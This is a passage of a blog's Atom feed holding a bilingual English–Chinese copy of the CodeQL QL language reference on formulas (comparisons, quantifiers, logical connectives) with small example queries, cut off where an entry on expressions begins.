      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Formulas</title>
    <link href="https://summersec.github.io/2021/03/17/Formulas/"/>
    <id>https://summersec.github.io/2021/03/17/Formulas/</id>
    <published>2021-03-17T01:22:16.000Z</published>
    <updated>2021-03-20T08:30:43.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Formulas¶公式"><a href="#Formulas¶公式" class="headerlink" title="Formulas¶公式"></a>Formulas<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas" target="_blank" rel="noopener">¶</a>公式</h1><p>Formulas define logical relations between the free variables used in expressions.</p><blockquote><p>公式定义了表达式中使用的自由变量之间的逻辑关系。</p></blockquote><p>Depending on the values assigned to those <a href="https://codeql.github.com/docs/ql-language-reference/variables/#free-variables" target="_blank" rel="noopener">free variables</a>, a formula can be true or false. When a formula is true, we often say that the formula <em>holds</em>. For example, the formula <code>x = 4 + 5</code> holds if the value <code>9</code> is assigned to <code>x</code>, but it doesn’t hold for other assignments to <code>x</code>. Some formulas don’t have any free variables. For example <code>1 &lt; 2</code> always holds, and <code>1 &gt; 2</code> never holds.</p><blockquote><p>根据分配给这些自由变量的值，一个公式可以是真或假。当一个公式为真时，我们经常说这个公式成立。例如，如果给x分配了数值9，则公式x = 4 + 5成立，但对于x的其他分配则不成立。例如，1 &lt; 2 总是成立，而 1 &gt; 2 从不成立。</p></blockquote><p>You usually use formulas in the bodies of classes, predicates, and select clauses to constrain the set of values that they refer to. For example, you can define a class containing all integers <code>i</code> for which the formula <code>i in [0 .. 9]</code> holds.</p><blockquote><p>你通常在类、谓词和选择子句的主体中使用公式来限制它们所引用的值集。例如，您可以定义一个包含所有整数 i 的类，其中公式 i 在 [0 … 9] 中成立。</p></blockquote><p>The following sections describe the kinds of formulas that are available in QL.</p><blockquote><p>下面的章节描述了QL中可用的公式的种类。</p></blockquote><h2 id="Comparisons¶比较"><a href="#Comparisons¶比较" class="headerlink" title="Comparisons¶比较"></a>Comparisons<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#comparisons" target="_blank" rel="noopener">¶</a>比较</h2><p>A comparison formula is of the form:</p><blockquote><p>比较公式的形式是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; &lt;operator&gt; &lt;expression&gt;</span><br></pre></td></tr></table></figure><p>See the tables below for an overview of the available comparison operators.</p><blockquote><p>请看下面的表格，了解可用的比较运算符的概况。</p></blockquote><h3 id="Order运算符"><a href="#Order运算符" class="headerlink" title="Order运算符"></a>Order运算符</h3><p>To compare two expressions using one of these order operators, each expression must have a type and those types must be <a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility" target="_blank" rel="noopener">compatible</a> and <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#ordering" target="_blank" rel="noopener">orderable</a>.</p><blockquote><p>要使用这些顺序运算符中的一个来比较两个表达式，每个表达式必须有一个类型，而且这些类型必须是兼容和可排序的。</p></blockquote><table><thead><tr><th align="left">Name</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">Greater than</td><td align="left"><code>&gt;</code></td></tr><tr><td align="left">Greater than or equal to</td><td align="left"><code>&gt;=</code></td></tr><tr><td align="left">Less than</td><td align="left"><code>&lt;</code></td></tr><tr><td align="left">Less than or equal to</td><td align="left"><code>&lt;=</code></td></tr></tbody></table><p>For example, the formulas <code>&quot;Ann&quot; &lt; &quot;Anne&quot;</code> and <code>5 + 6 &gt;= 11</code> both hold.</p><blockquote><p>例如，公式 “Ann”&lt;”Anne “和5+6&gt;=11都成立。</p></blockquote><h3 id="Equality¶平等"><a href="#Equality¶平等" class="headerlink" title="Equality¶平等"></a>Equality<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#equality" target="_blank" rel="noopener">¶</a>平等</h3><p>To compare two expressions using <code>=</code>, at least one of the expressions must have a type. If both expressions have a type, then their types must be <a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility" target="_blank" rel="noopener">compatible</a>.</p><blockquote><p>要使用=比较两个表达式，至少其中一个表达式必须有一个类型。如果两个表达式都有一个类型，那么它们的类型必须是兼容的。</p></blockquote><p>To compare two expressions using <code>!=</code>, both expressions must have a type. Those types must also be <a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility" target="_blank" rel="noopener">compatible</a>.</p><blockquote><p>要使用 != 比较两个表达式，两个表达式必须有一个类型。这些类型也必须是兼容的。</p></blockquote><table><thead><tr><th align="left">Name</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">Equal to</td><td align="left"><code>=</code></td></tr><tr><td align="left">Not equal to</td><td align="left"><code>!=</code></td></tr></tbody></table><p>For example, <code>x.sqrt() = 2</code> holds if <code>x</code> is <code>4</code>, and <code>4 != 5</code> always holds.</p><blockquote><p>例如，如果 x 是 4，x.sqrt() = 2 成立，而 4 !=5 总是成立。</p></blockquote><p>For expressions <code>A</code> and <code>B</code>, the formula <code>A = B</code> holds if there is a pair of values—one from <code>A</code> and one from <code>B</code>—that are the same. In other words, <code>A</code> and <code>B</code> have at least one value in common. For example, <code>[1 .. 2] = [2 .. 5]</code> holds, since both expressions have the value <code>2</code>.</p><blockquote><p>对于表达式 A 和 B，如果有一对值–一个来自 A，一个来自 B–相同，则公式 A = B 成立。换句话说，A和B至少有一个共同的值。例如，[1 … 2]=[2 … 5]成立，因为两个表达式的值都是2。</p></blockquote><p>As a consequence, <code>A != B</code> has a very different meaning to the <a href="https://codeql.github.com/docs/ql-language-reference/formulas/#negation" target="_blank" rel="noopener">negation</a> <code>not A = B</code> <a href="https://codeql.github.com/docs/ql-language-reference/formulas/#id10" target="_blank" rel="noopener">[1]</a>:</p><blockquote><p>因此，A !=B与否定式not A = B [1]的意义截然不同: </p></blockquote><ul><li><p><code>A != B</code> holds if there is a pair of values (one from <code>A</code> and one from <code>B</code>) that are different.</p><blockquote><p>如果有一对不同的值(一个来自A, 一个来自B), 则A != B成立.</p></blockquote></li><li><p><code>not A = B</code> holds if it is <em>not</em> the case that there is a pair of values that are the same. In other words, <code>A</code> and <code>B</code> have no values in common.</p><blockquote><p>如果不是存在一对数值相同的情况，则not A = B成立。换句话说，A和B没有共同的值。</p></blockquote></li></ul><p><strong>Examples</strong></p><ol><li><ul><li><p>If both expressions have a single value (for example <code>1</code> and <code>0</code>), then comparison is straightforward:</p><blockquote><p>如果两个表达式都只有一个值（例如1和0），那么比较就很直接:</p></blockquote><p>   <code>1 != 0</code> holds.<code>1 = 0</code> doesn’t hold.<code>not 1 = 0</code> holds.</p></li></ul></li><li><ul><li><p>Now compare <code>1</code> and <code>[1 .. 2]</code>:</p><p>   <code>1 != [1 .. 2]</code> holds, because <code>1 != 2</code>.<code>1 = [1 .. 2]</code> holds, because <code>1 = 1</code>.<code>not 1 = [1 .. 2]</code> doesn’t hold, because there is a common value (<code>1</code>).</p></li></ul></li><li><ul><li><p>Compare <code>1</code> and <code>none()</code> (the “empty set”):</p><p>   <code>1 != none()</code> doesn’t hold, because there are no values in <code>none()</code>, so no values that are not equal to <code>1</code>.<code>1 = none()</code> also doesn’t hold, because there are no values in <code>none()</code>, so no values that are equal to <code>1</code>.<code>not 1 = none()</code> holds, because there are no common values.</p></li></ul></li></ol><h2 id="Type-checks¶类型检查"><a href="#Type-checks¶类型检查" class="headerlink" title="Type checks¶类型检查"></a>Type checks<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#type-checks" target="_blank" rel="noopener">¶</a>类型检查</h2><p>A type check is a formula that looks like:</p><blockquote><p>范围检查是一个公式就像:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; instanceof &lt;type&gt;</span><br></pre></td></tr></table></figure><p>You can use a type check formula to check whether an expression has a certain type. For example, <code>x instanceof Person</code> holds if the variable <code>x</code> has type <code>Person</code>.</p><blockquote><p>你可以使用类型检查公式来检查一个表达式是否具有某种类型。例如，如果变量x的类型为Person，则x instanceof Person成立。</p></blockquote><h2 id="Range-checks¶范围检查"><a href="#Range-checks¶范围检查" class="headerlink" title="Range checks¶范围检查"></a>Range checks<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#range-checks" target="_blank" rel="noopener">¶</a>范围检查</h2><p>A range check is a formula that looks like:</p><blockquote><p>范围检查是一个公式就像:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; in &lt;range&gt;</span><br></pre></td></tr></table></figure><p>You can use a range check formula to check whether a numeric expression is in a given <a href="https://codeql.github.com/docs/ql-language-reference/expressions/#ranges" target="_blank" rel="noopener">range</a>. For example, <code>x in [2.1 .. 10.5]</code> holds if the variable <code>x</code> is between the values <code>2.1</code> and <code>10.5</code> (including <code>2.1</code> and <code>10.5</code> themselves).</p><blockquote><p>你可以使用范围检查公式来检查一个数字表达式是否在给定的范围内。例如，x在[2.1 … 10.5]中，如果变量x在值2.1和10.5之间（包括2.1和10.5本身），则该变量成立。</p></blockquote><p>Note that <code>&lt;expression&gt; in &lt;range&gt;</code> is equivalent to <code>&lt;expression&gt; = &lt;range&gt;</code>. Both formulas check whether the set of values denoted by <code>&lt;expression&gt;</code> is the same as the set of values denoted by <code>&lt;range&gt;</code>.</p><blockquote><p>注意，<range>中的<expression>相当于<expression>=<range>。两个公式都检查<expression>表示的值集是否与<range>表示的值集相同。</range></expression></range></expression></expression></range></p></blockquote><h2 id="Calls-to-predicates¶调用谓词"><a href="#Calls-to-predicates¶调用谓词" class="headerlink" title="Calls to predicates¶调用谓词"></a>Calls to predicates<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#calls-to-predicates" target="_blank" rel="noopener">¶</a>调用谓词</h2><p>A call is a formula or <a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions" target="_blank" rel="noopener">expression</a> that consists of a reference to a predicate and a number of arguments.</p><blockquote><p>调用是一个公式或表达式，它由对谓词的引用和一些参数组成。</p></blockquote><p>For example, <code>isThree(x)</code> might be a call to a predicate that holds if the argument <code>x</code> is <code>3</code>, and <code>x.isEven()</code> might be a call to a member predicate that holds if <code>x</code> is even.</p><blockquote><p>例如，isThree(x)可能是对一个谓词的调用，如果参数x是3，这个谓词就成立；x.isEven()可能是对一个成员谓词的调用，如果x是偶数，这个谓词就成立。</p></blockquote><p>A call to a predicate can also contain a closure operator, namely <code>*</code> or <code>+</code>. For example, <code>a.isChildOf+(b)</code> is a call to the <a href="https://codeql.github.com/docs/ql-language-reference/recursion/#transitive-closures" target="_blank" rel="noopener">transitive closure</a> of <code>isChildOf()</code>, so it holds if <code>a</code> is a descendent of <code>b</code>.</p><blockquote><p>对谓词的调用也可以包含一个闭合操作符，即 * 或 +。例如，a.isChildOf+(b)是对isChildOf()的转义闭包的调用，所以如果a是b的后裔，它就成立。</p></blockquote><p>The predicate reference must resolve to exactly one predicate. For more information about how a predicate reference is resolved, see “<a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution" target="_blank" rel="noopener">Name resolution</a>.”</p><blockquote><p>谓词引用必须精确地解析到一个谓词。有关如何解析谓词引用的更多信息，请参阅 “名称解析”。</p></blockquote><p>If the call resolves to a predicate without result, then the call is a formula.</p><blockquote><p>如果调用解析到一个没有结果的谓词，那么这个调用就是一个公式。</p></blockquote><p>It is also possible to call a predicate with result. This kind of call is an expression in QL, instead of a formula. For more information, see “<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#calls-with-result" target="_blank" rel="noopener">Calls to predicates (with result)</a>.”</p><blockquote><p>也可以调用一个有结果的谓词。这种调用是QL中的表达式，而不是公式。更多信息，请参阅 “对谓词的调用（带结果）”。</p></blockquote><h2 id="Parenthesized-formulas¶括号公式"><a href="#Parenthesized-formulas¶括号公式" class="headerlink" title="Parenthesized formulas¶括号公式"></a>Parenthesized formulas<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#parenthesized-formulas" target="_blank" rel="noopener">¶</a>括号公式</h2><p>A parenthesized formula is any formula surrounded by parentheses, <code>(</code> and <code>)</code>. This formula has exactly the same meaning as the enclosed formula. The parentheses often help to improve readability and group certain formulas together.</p><blockquote><p>括号公式是指任何用括号、（和）包围的公式。这个公式与被包围的公式具有完全相同的含义。小括号通常有助于提高可读性，并将某些公式组合在一起。</p></blockquote><h2 id="Quantified-formulas¶量化公式"><a href="#Quantified-formulas¶量化公式" class="headerlink" title="Quantified formulas¶量化公式"></a>Quantified formulas<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#quantified-formulas" target="_blank" rel="noopener">¶</a>量化公式</h2><p>A quantified formula introduces temporary variables and uses them in formulas in its body. This is a way to create new formulas from existing ones.</p><blockquote><p>量化公式引入了临时变量，并在其主体的公式中使用它们。这是一种从现有公式创建新公式的方法。</p></blockquote><h3 id="Explicit-quantifiers¶显示量词"><a href="#Explicit-quantifiers¶显示量词" class="headerlink" title="Explicit quantifiers¶显示量词"></a>Explicit quantifiers<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#explicit-quantifiers" target="_blank" rel="noopener">¶</a>显示量词</h3><p>The following explicit “quantifiers” are the same as the usual existential and universal quantifiers in mathematical logic.</p><blockquote><p>以下明确的 “量词 “与数理逻辑中常用的存在量词和普遍量词相同。</p></blockquote><h4 id="exists"><a href="#exists" class="headerlink" title="exists"></a><code>exists</code></h4><p>This quantifier has the following syntax:</p><blockquote><p>此量词具有以下语法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists(&lt;variable declarations&gt; | &lt;formula&gt;)</span><br></pre></td></tr></table></figure><p>You can also write <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>. This is equivalent to <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>.</p><blockquote><p>你也可以写 exist(&lt;变量声明&gt; | &lt;公式1&gt; | &lt;公式2&gt;)。这相当于 exists(&lt;变量声明&gt; | &lt;公式1&gt; 和 &lt;公式2&gt;)。</p></blockquote><p>This quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.</p><blockquote><p>这个量化公式引入了一些新的变量。如果至少有一组变量的值可以使正文中的公式为真，它就成立。</p></blockquote><p>For example, <code>exists(int i | i instanceof OneTwoThree)</code> introduces a temporary variable of type <code>int</code> and holds if any value of that variable has type <code>OneTwoThree</code>.</p><blockquote><p>例如，exists(int i | i instanceof OneTwoThree)引入了一个类型为int的临时变量，如果该变量的任何值具有OneTwoThree类型，则该变量成立。</p></blockquote><h4 id="forall"><a href="#forall" class="headerlink" title="forall"></a><code>forall</code></h4><p>This quantifier has the following syntax:</p><blockquote><p>此量词具有以下语法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forall(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><p><code>forall</code> introduces some new variables, and typically has two formulas in its body. It holds if <code>&lt;formula 2&gt;</code> holds for all values that <code>&lt;formula 1&gt;</code> holds for.</p><blockquote><p>forall 引入了一些新的变量，通常在它的正文中有两个公式。如果&lt;公式2&gt;对&lt;公式1&gt;的所有值都成立，那么它就成立。</p></blockquote><p>For example, <code>forall(int i | i instanceof OneTwoThree | i &lt; 5)</code> holds if all integers that are in the class <code>OneTwoThree</code> are also less than <code>5</code>. In other words, if there is a value in <code>OneTwoThree</code> that is greater than or equal to <code>5</code>, then the formula doesn’t hold.</p><blockquote><p>例如，forall(int i | i instanceof OneTwoThree | i &lt; 5) 如果所有在 OneTwoThree 类中的整数也小于 5，则 forall(int i | i instanceof OneTwoThree | i &lt; 5) 成立。换句话说，如果 OneTwoThree 中有一个值大于或等于 5，那么这个公式就不成立。</p></blockquote><p>Note that <code>forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code> is logically the same as <code>not exists(&lt;vars&gt; | &lt;formula 1&gt; | not &lt;formula 2&gt;)</code>.</p><blockquote><p>请注意，forall(<vars> | &lt;公式1&gt; | &lt;公式2&gt;)在逻辑上与不存在(<vars> | &lt;公式1&gt; | 不&lt;公式2&gt;)是一样的。</vars></vars></p></blockquote><h4 id="forex"><a href="#forex" class="headerlink" title="forex"></a><code>forex</code></h4><p>This quantifier has the following syntax:</p><blockquote><p>此量词具有以下语法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forex(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><p>This quantifier exists as a shorthand for:</p><blockquote><p>这个量化符是作为以下函数的简写而存在:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;) and</span><br><span class="line">exists(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><p>In other words, <code>forex</code> works in a similar way to <code>forall</code>, except that it ensures that there is at least one value for which <code>&lt;formula 1&gt;</code> holds. To see why this is useful, note that the <code>forall</code> quantifier could hold trivially. For example, <code>forall(int i | i = 1 and i = 2 | i = 3)</code> holds: there are no integers <code>i</code> which are equal to both <code>1</code> and <code>2</code>, so the second part of the body <code>(i = 3)</code> holds for every integer for which the first part holds.</p><blockquote><p>换句话说，forex的工作方式与forall类似，只是它确保至少有一个值的&lt;公式1&gt;成立。要知道为什么这很有用，请注意forall量化符可以琐碎地保持。例如，forall(int i | i = 1 and i = 2 | i = 3)成立：没有整数i既等于1又等于2，所以主体的第二部分(i = 3)对第一部分成立的每个整数都成立。</p></blockquote><p>Since this is often not the behavior that you want in a query, the <code>forex</code> quantifier is a useful shorthand.</p><blockquote><p>由于这往往不是你在查询中想要的行为，所以外汇量化符是一个有用的速记符。</p></blockquote><h3 id="Implicit-quantifiers¶隐式量词"><a href="#Implicit-quantifiers¶隐式量词" class="headerlink" title="Implicit quantifiers¶隐式量词"></a>Implicit quantifiers<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#implicit-quantifiers" target="_blank" rel="noopener">¶</a>隐式量词</h3><p>Implicitly quantified variables can be introduced using “don’t care expressions.” These are used when you need to introduce a variable to use as an argument to a predicate call, but don’t care about its value. For further information, see “<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#don-t-care-expressions" target="_blank" rel="noopener">Don’t-care expressions</a>.”</p><blockquote><p>可以使用 “不在乎表达式 “引入隐式量词的变量。当您需要引入一个变量作为谓词调用的参数，但不关心它的值时，就会使用这些变量。有关更多信息，请参阅 “不在乎表达式”。</p></blockquote><h2 id="Logical-connectives¶逻辑连接词"><a href="#Logical-connectives¶逻辑连接词" class="headerlink" title="Logical connectives¶逻辑连接词"></a>Logical connectives<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#logical-connectives" target="_blank" rel="noopener">¶</a>逻辑连接词</h2><p>You can use a number of logical connectives between formulas in QL. They allow you to combine existing formulas into longer, more complex ones.</p><blockquote><p>在QL中，您可以在公式之间使用一些逻辑连接。它们允许您将现有的公式组合成更长、更复杂的公式。</p></blockquote><p>To indicate which parts of the formula should take precedence, you can use parentheses. Otherwise, the order of precedence from highest to lowest is as follows:</p><blockquote><p>为了指示公式的哪些部分应该优先，您可以使用括号。否则，从高到低的优先顺序如下:</p></blockquote><ol><li>Negation (<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#negation" target="_blank" rel="noopener">not</a>)</li><li>Conditional formula (<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#conditional" target="_blank" rel="noopener">if … then … else</a>)</li><li>Conjunction (<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#conjunction" target="_blank" rel="noopener">and</a>)</li><li>Disjunction (<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#disjunction" target="_blank" rel="noopener">or</a>)</li><li>Implication (<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#implication" target="_blank" rel="noopener">implies</a>)</li></ol><p>For example, <code>A and B implies C or D</code> is equivalent to <code>(A and B) implies (C or D)</code>.</p><blockquote><p>例如，A和B意味着C或D相当于（A and B）意味着（C or D）。</p></blockquote><p>Similarly, <code>A and not if B then C else D</code> is equivalent to <code>A and (not (if B then C else D))</code>.</p><blockquote><p>  同理，A and not if B then C else D等同于A and (not (if B then C else D))。</p></blockquote><p>Note that the <a href="https://codeql.github.com/docs/ql-language-reference/formulas/#parenthesized-formulas" target="_blank" rel="noopener">parentheses</a> in the above examples are not necessary, since they highlight the default precedence. You usually only add parentheses to override the default precedence, but you can also add them to make your code easier to read (even if they aren’t required).</p><blockquote><p>请注意，上述例子中的括号不是必须的，因为它们突出了默认的优先级。您通常只添加括号来覆盖默认的优先级，但您也可以添加括号来使您的代码更容易阅读（即使它们不是必需的）。</p></blockquote><p>The logical connectives in QL work similarly to Boolean connectives in other programming languages. Here is a brief overview:</p><blockquote><p>QL中的逻辑连接符的工作原理与其他编程语言中的布尔连接符类似。下面是一个简单的概述:</p></blockquote><h3 id="not"><a href="#not" class="headerlink" title="not"></a><code>not</code></h3><p>You can use the keyword <code>not</code> before a formula. The resulting formula is called a negation.</p><p><code>not A</code> holds exactly when <code>A</code> doesn’t hold.</p><blockquote><p>你可以在公式前使用关键字not。由此产生的公式称为否定式。</p></blockquote><p><strong>Example</strong></p><p>The following query selects files that are not HTML files.</p><blockquote><p>下面的查询选择非HTML文件的文件。    </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from File f</span><br><span class="line">where not f.getFileType().isHtml()</span><br><span class="line">select f</span><br></pre></td></tr></table></figure><blockquote><p>Note</p><p>You should be careful when using <code>not</code> in a recursive definition, as this could lead to non-monotonic recursion. For more information, “<a href="https://codeql.github.com/docs/ql-language-reference/recursion/#non-monotonic-recursion" target="_blank" rel="noopener">Non-monotonic recursion</a>.”</p><p>在递归定义中使用not时应该小心，因为这可能导致非单调递归。更多信息，”非单调递归”。</p></blockquote><h3 id="if-then-else"><a href="#if-then-else" class="headerlink" title="if ... then ... else"></a><code>if ... then ... else</code></h3><p>You can use these keywords to write a conditional formula. This is another way to simplify notation: <code>if A then B else C</code> is the same as writing <code>(A and B) or ((not A) and C)</code>.</p><blockquote><p> 你可以用这些关键字来写一个条件公式。这是另一种简化符号的方法：如果 A 那么 B else C 与写 (A and  B) or ((not A) and C) 是一样的。</p></blockquote><p><strong>Example</strong></p><p>With the following definition, <code>visibility(c)</code> returns <code>&quot;public&quot;</code> if <code>x</code> is a public class and returns <code>&quot;private&quot;</code> otherwise:</p><blockquote><p>通过下面的定义，如果x是一个公共类，则visibility(c)返回 “public”，否则返回 “private”:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string visibility(Class c)&#123;</span><br><span class="line">  if c.isPublic()</span><br><span class="line">  then result &#x3D; &quot;public&quot;</span><br><span class="line">  else result &#x3D; &quot;private&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="and"><a href="#and" class="headerlink" title="and"></a><code>and</code></h3><p>You can use the keyword <code>and</code> between two formulas. The resulting formula is called a conjunction.</p><p><code>A and B</code> holds if, and only if, both <code>A</code> and <code>B</code> hold.</p><blockquote><p>你可以在两个公式之间使用关键字和。由此产生的公式称为连词。</p></blockquote><p><strong>Example</strong></p><p>The following query selects files that have the <code>js</code> extension and contain fewer than 200 lines of code:</p><blockquote><p>下面的查询选择了以js为扩展名且包含少于200行代码的文件:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from File f</span><br><span class="line">where f.getExtension() &#x3D; &quot;js&quot; and</span><br><span class="line">  f.getNumberOfLinesOfCode() &lt; 200</span><br><span class="line">select f</span><br></pre></td></tr></table></figure><h3 id="or"><a href="#or" class="headerlink" title="or"></a><code>or</code></h3><p>You can use the keyword <code>or</code> between two formulas. The resulting formula is called a disjunction.</p><blockquote><p>可以在两个公式之间使用关键字或。由此产生的公式称为析取。</p></blockquote><p><code>A or B</code> holds if at least one of <code>A</code> or <code>B</code> holds.</p><blockquote><p>如果 A 或 B 中至少有一个成立，则 A 或 B 成立。</p></blockquote><p><strong>Example</strong></p><p>With the following definition, an integer is in the class <code>OneTwoThree</code> if it is equal to <code>1</code>, <code>2</code>, or <code>3</code>:</p><blockquote><p>在下面的定义中，如果整数等于 1、2 或 3，则该整数属于 OneTwoThree 类：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="implies"><a href="#implies" class="headerlink" title="implies"></a><code>implies</code></h3><p>You can use the keyword <code>implies</code> between two formulas. The resulting formula is called an implication. This is just a simplified notation: <code>A implies B</code> is the same as writing <code>(not A) or B</code>.</p><blockquote><p>你可以在两个公式之间使用关键字 implies。由此产生的公式称为内涵式。这只是一个简化的符号。A暗示B和写（不是A）或B是一样的。</p></blockquote><p><strong>Example</strong></p><p>The following query selects any <code>SmallInt</code> that is odd, or a multiple of <code>4</code>.</p><blockquote><p>下面的查询选择了任何一个奇数或4的倍数的SmallInt。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class SmallInt extends int &#123;</span><br><span class="line">  SmallInt() &#123; this &#x3D; [1 .. 10] &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SmallInt x</span><br><span class="line">where x % 2 &#x3D; 0 implies x % 4 &#x3D; 0</span><br><span class="line">select x</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/38u19er38ec/38u19er38ec.png" alt="image-20210317181938737"></p><p>Footnotes</p><table><thead><tr><th><a href="https://codeql.github.com/docs/ql-language-reference/formulas/#id3" target="_blank" rel="noopener">[1]</a></th><th>The difference between <code>A != B</code> and <code>not A = B</code> is due to the underlying quantifiers. If you think of <code>A</code> and <code>B</code> as sets of values, then <code>A != B</code> means:</th></tr></thead><tbody><tr><td>[1]</td><td>A != B和不是A = B之间的区别是由于底层的量词。如果你把A和B看作是值的集合，那么A != B的意思是。</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists( a, b | a in A and b in B | a !&#x3D; b )</span><br></pre></td></tr></table></figure><p>On the other hand, <code>not A = B</code> means:</p><blockquote><p>另一方面，不存在A=B意味着:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">not exists( a, b | a in A and b in B | a &#x3D; b )</span><br></pre></td></tr></table></figure><p>This is equivalent to <code>forall( a, b | a in A and b in B | a != b )</code>, which is very different from the first formula.</p><blockquote><p>这相当于forall( a, b | a in A and b in B | a != b )，这与第一个公式有很大不同。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Formulas¶公式&quot;&gt;&lt;a href=&quot;#Formulas¶公式&quot; class=&quot;headerlink&quot; title=&quot;Formulas¶公式&quot;&gt;&lt;/a&gt;Formulas&lt;a href=&quot;https://codeql.github.com/docs/ql-la
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Expression</title>
    <link href="https://summersec.github.io/2021/03/16/Expressions/"/>
    <id>https://summersec.github.io/2021/03/16/Expressions/</id>
    <published>2021-03-16T11:22:16.000Z</published>
    <updated>2021-03-20T08:30:02.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Expressions¶表达式"><a href="#Expressions¶表达式" class="headerlink" title="Expressions¶表达式"></a>Expressions<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions" target="_blank" rel="noopener">¶</a>表达式</h1><p>An expression evaluates to a set of values and has a type.</p><blockquote><p>表达式对一组值进行评估，并有一个类型。</p></blockquote><p>For example, the expression <code>1 + 2</code> evaluates to the integer <code>3</code> and the expression <code>&quot;QL&quot;</code> evaluates to the string <code>&quot;QL&quot;</code>. <code>1 + 2</code> has <a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">type</a> <code>int</code> and <code>&quot;QL&quot;</code> has type <code>string</code>.</p><blockquote><p>例如，表达式1 + 2的值是整数3，表达式 “QL “的值是字符串 “QL”。1 + 2 的类型是 int，”QL “的类型是字符串。</p></blockquote><p>The following sections describe the expressions that are available in QL.</p><blockquote><p>下面的章节将描述QL中可用的表达式。</p></blockquote><h2 